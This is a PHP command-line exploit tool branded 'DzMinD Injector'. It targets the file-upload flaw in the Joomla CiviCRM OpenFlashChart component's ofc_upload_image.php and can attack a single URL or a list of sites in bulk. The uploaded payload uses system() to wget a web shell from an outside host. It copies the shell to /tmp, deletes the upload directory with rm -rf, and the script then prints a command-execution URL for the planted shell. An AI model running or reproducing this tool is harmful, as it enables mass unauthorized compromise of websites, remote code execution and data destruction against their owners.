<?php
echo "\033[2J\033[0;0H";

$green = "\033[32m";
$cyan  = "\033[36m";
$reset = "\033[0m";

echo $cyan."
                                                                                                          
 ██████████                 ██████   ██████  ███             ██████████      █████                 ███                     █████                      
░░███░░░░███               ░░██████ ██████  ░░░             ░░███░░░░███    ░░███                 ░░░                     ░░███                       
 ░███   ░░███  █████████    ░███░█████░███  ████  ████████   ░███   ░░███    ░███  ████████       █████  ██████   ██████  ███████    ██████  ████████ 
 ░███    ░███ ░█░░░░███     ░███░░███ ░███ ░░███ ░░███░░███  ░███    ░███    ░███ ░░███░░███     ░░███  ███░░███ ███░░███░░░███░    ███░░███░░███░░███
 ░███    ░███ ░   ███░      ░███ ░░░  ░███  ░███  ░███ ░███  ░███    ░███    ░███  ░███ ░███      ░███ ░███████ ░███ ░░░   ░███    ░███ ░███ ░███ ░░░ 
 ░███    ███    ███░   █    ░███      ░███  ░███  ░███ ░███  ░███    ███     ░███  ░███ ░███      ░███ ░███░░░  ░███  ███  ░███ ███░███ ░███ ░███     
 ██████████    █████████    █████     █████ █████ ████ █████ ██████████      █████ ████ █████     ░███ ░░██████ ░░██████   ░░█████ ░░██████  █████    
░░░░░░░░░░    ░░░░░░░░░    ░░░░░     ░░░░░ ░░░░░ ░░░░ ░░░░░ ░░░░░░░░░░      ░░░░░ ░░░░ ░░░░░      ░███  ░░░░░░   ░░░░░░     ░░░░░   ░░░░░░  ░░░░░     
                                                                                              ███ ░███                                                
                                                                                             ░░██████                                                 
                                                                                              ░░░░░░  
                    https://github.com/dzmind2312                               
".$reset;

$options = getopt('u:f:l:');

if (!isset($options['f']) || (!isset($options['u']) && !isset($options['l']))) {
    die("\n        Usage examples:\n
php jnews.php -u http://target.com/ -f post.php
php jnews.php -l list.txt -f post.php

-u http://target.com/      The full path to Joomla!
-l list.txt                File containing one URL per line
-f post.php                The name of the file to create.\n");
}

$file = $options['f'];

function exploit_target($baseUrl, $file) {

    // Codes couleurs ANSI
    $green = "\033[32m";
    $red   = "\033[31m";
    $yellow= "\033[33m";
    $reset = "\033[0m";

    $url = rtrim($baseUrl, '/').'/';

    $shell = "{$url}administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/tmp-upload-images/{$file}";
    $url   = "{$url}administrator/components/com_civicrm/civicrm/packages/OpenFlashChart/php-ofc-library/ofc_upload_image.php?name={$file}";

    $data = '<?php 
 system("wget http://www.securityweb.org/shell.txt; mv shell.txt post.php");
 system("cp post.php ../../../../../../../tmp/post.php");
 system("cd ..; rm -rf tmp-upload-images");
 echo "by Dz MinD Injector" ; 
 fclose ( $handle ); 
 ?>';

    $headers = array(
        'User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
        'Content-Type: text/plain'
    );

    echo "        {$yellow}[+] Submitting request to: {$baseUrl}{$reset}\n";

    $handle = curl_init();

    curl_setopt($handle, CURLOPT_URL, $url);
    curl_setopt($handle, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($handle, CURLOPT_POSTFIELDS, $data);
    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);

    $source = curl_exec($handle);
    curl_close($handle);

    if (!strpos($source, 'Undefined variable: HTTP_RAW_POST_DATA') && @fopen($shell, 'r')) {
        echo "        {$green}[+] Exploit completed successfully!{$reset}\n";
        echo "        ______________________________________________\n\n";
        echo "        {$shell}?cmd=system('id');\n\n";
    } else {
        echo "        {$red}[+] Exploit was faled.{$reset}\n";
    }
}

if (isset($options['u'])) {

    
    exploit_target($options['u'], $file);

} elseif (isset($options['l'])) {

   
    $listFile = $options['l'];

    if (!file_exists($listFile)) {
        die("        [+] List file not found: {$listFile}\n");
    }

    $lines = file($listFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        $target = trim($line);
        if ($target === '' || $target[0] === '#') {
            continue;
        }
        exploit_target($target, $file);
    }
}

?>
